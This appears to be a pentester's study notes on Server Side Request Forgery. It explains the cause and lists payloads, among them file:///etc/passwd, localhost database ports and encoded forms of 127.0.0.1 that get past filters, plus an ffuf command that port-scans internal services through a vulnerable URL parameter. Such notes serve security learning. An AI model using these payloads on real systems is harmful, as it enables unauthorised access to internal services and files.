# Server Side Request Forgery

In simpler terms, SSRF is a vulnerability in web applications whereby an attacker can make further HTTP requests through the server. An attacker can make use of this vulnerability to communicate with any internal services on the server's network which are generally protected by firewalls.
 
 ![[docs/Pasted image 20210617214652.png]]
 
 Some techniques (more on payload all the things)
 ![[docs/DEF CON 25 - Orange-Tsai-A-New-Era-of-SSRF-Exploiting-URL-Parser in-Trending-Programming-Languages-UPDATED.pdf]]
 
 The main cause of the vulnerability is (as it often is) blindly trusting input from a user. In the case of an SSRF vulnerability, a user would be asked to input a URL (or maybe an IP address). The web application would use that to make a request. SSRF comes about when the input hasn't been properly checked or filtered.
 
 python stuff: https://medium.com/poka-techblog/server-side-request-forgery-ssrf-part-3-other-advanced-techniques-3f48cbcad27e
 
 # Payloads
 
 also scan for schemes like jar:
 
 ```plaintext
 file:///etc/passwd
 http://127.0.0.1:3306
 http://[::]:3306
 
 #python (flask / django)
 http://:::3306
 ```
 
 The IP "`127.0.0.1`" can be replaced with its Decimal and Hexadecimal counterparts to bypass the restrictions. The decimal version of the localhost IP would be "2130706433" and the Hexadecimal version would be "0x7f000001".
 
 **Note** \- There is a script to do this conversion process, you can find it [here](https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72)
 
 # Portscan via Fuff

create a list with all ports:

```
for i in {1..65535}; do echo $i >> all_ports.txt; done
```


```bash
ffuf -w /usr/share/seclists/Discovery/Infrastructure/all_ports.txt -u 'http://10.10.151.214:8000/attack?url=http%3A%2F%2Flocaltest.me%3AFUZZ' -fs 1045
```

